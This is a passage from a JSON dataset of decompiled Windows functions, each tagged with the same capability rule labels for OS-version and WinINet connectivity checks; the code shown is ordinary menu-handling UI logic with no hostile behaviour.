        "decompiled_code": "\nvoid __cdecl fcn.00435608(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x4357ea;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.0040483c();\n    cVar2 = fcn.004047cc();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.004355bc(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.00435f78();\n    var_10h = fcn.0043558c();\n    fcn.00405894();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x004356f3;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x004356f3:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403aac();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004047cc();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00432f58();\n        fcn.00405784();\n    }\n    uVar4 = *(uVar4 * 2 + 0x4914c4) | 0x560;\n    fcn.00433efc(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.0040546c(0x4357f1);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 944
    },
    "00435844": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00435844(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.004359b8(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.004359c8();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.00435890();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00435890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435890(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.00433e6c(*(in_EAX + 0x50), *(param_2 * 4 + 0x49144c));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.00435844();\n        }\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "004358e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004358e4(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x492aec != 2) || (iVar1 = fcn.004359b8(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.00433e6c(*(in_EAX + 0x14), *(param_2 * 4 + 0x491454));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 275
    },
    "0043595c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043595c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.00435d20();\n            fcn.00433e0c();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.00435844();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004359c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004359c8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.00432eac();\n    }\n    fcn.004197d8();\n    return;\n}\n",
        "token_count": 63
    },
    "00435b44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435b44(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.00432eac();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00404610();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.004197d8();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.004197d8();\n            fcn.0043595c();\n        }\n    }\n    fcn.00433e0c();\n    fcn.00419854();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.00435dc0;\n    if (in_EAX[0xd] != 0) {\n        fcn.00433d3c();\n    }\n    fcn.004359b8();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 351
    },
    "00435bfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435bfc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.004359b8();\n        if (param_2 < iVar1) goto code_r0x00435c22;\n    }\n    fcn.00432eac();\ncode_r0x00435c22:\n    iVar1 = fcn.004197d8();\n    fcn.004196cc();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.00433d3c();\n    }\n    fcn.004359b8();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 232
    },
    "00435dc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435dc0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.00433d3c();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004047cc();\n        if (cVar1 != '\\0') {\n            fcn.00437d44();\n        }\n    }\n    else {\n        fcn.00435dc0(0);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00436a8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00436a8c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.00436c14(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.004359b8();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.004359c8();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.004359c8();\n                    cVar1 = fcn.00436a68();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.004359c8();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.004359b8();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.004359c8();\n                cVar1 = fcn.00436a68();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.004359c8();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.004359c8();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.004359b8();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.004359c8();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.004359c8();\n                    cVar1 = fcn.00436a68();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.004359c8();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 842
    },
    "00436be4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00436be4(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00436be4();\n        uVar1 = *((uVar1 & 0x7f) + 0x4913fc);\n    }\n    return *((uVar1 & 0x7f) + 0x491400);\n}\n",
        "token_count": 137
    },
    "00436c14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00436c14(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00436c14();\n        uVar1 = *((uVar1 & 0x7f) + 0x4913fc);\n    }\n    return *((uVar1 & 0x7f) + 0x491400);\n}\n",
        "token_count": 137
    },
    "00436c44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.00436c44(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.00433838();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00404610();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x437784;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041f838();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.00437bf4();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 357
    },
    "00436da4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00436da4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.004359b8();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.004359c8();\n                cVar1 = fcn.00436da4(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 369
    },
    "00436e6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00436e6c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004047cc(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00438410();\n    }\n    else {\n        for (iVar2 = fcn.00436e3c(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 241
    },
    "00436fc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00436fc0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "00437214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.00437214(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x437242;\n        var_1h._0_1_ = fcn.00437214(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.00436e3c();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.00437204();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x43733a;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.00435ee4();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 651
    },
    "00437368": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437368(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x43737c;\n    cVar1 = fcn.00437178();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x43738b;\n    fcn.004371b4();\n    puStack36 = 0x4373a5;\n    fcn.0042c658();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x43743b;\n    puStack48 = 0x4373c5;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.00436e3c();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x437442;\n        uStack40 = 0x43743a;\n        uVar3 = fcn.0042c650();\n        return uVar3;\n    }\n    puStack48 = 0x4373db;\n    fcn.0042c658();\n    uStack52 = 0x437410;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00437214(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x437417;\n    uStack52 = 0x43740f;\n    uVar3 = fcn.0042c650();\n    return uVar3;\n}\n",
        "token_count": 448
    },
    "00437464": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437464(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x43748b;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.004377f8();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.004377f8();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "004375cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004375cc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.00437520(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.004058fc();\n        iVar1 = fcn.0040a954();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.004056dc();\n    return 1;\n}\n",
        "token_count": 172
    },
    "00437660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437660(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x492b04 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x4376d4;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.00437bd0();\n        }\n        else {\n            fcn.00437bd0();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x4376db;\n        uStack20 = 0x4376c9;\n        fcn.00437bd0();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "004376e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004376e0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.004375cc();\n    if ((*(*0x492b04 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.00437660();\n        }\n        else {\n            fcn.00437bf4();\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "004377f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004377f8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "004379ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
